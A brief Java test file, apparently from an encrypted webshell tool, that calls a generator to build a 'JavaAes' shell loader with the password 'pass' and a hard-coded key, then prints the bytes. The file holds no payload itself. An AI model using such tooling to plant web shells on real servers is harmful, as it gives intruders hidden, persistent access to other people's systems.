package shells.cryptions.JavaAes;

/**
 * @FileName: test
 * @Date: 2025/7/25/15:47
 * @Author: Eviden
 */
public class test {
    public static void main(String[] args) {
        byte[] bytes = Generate.GenerateShellLoder("JavaAes", "pass", "3c6e0b8a9c15224a", false);
        System.out.println(bytes);
    }
}
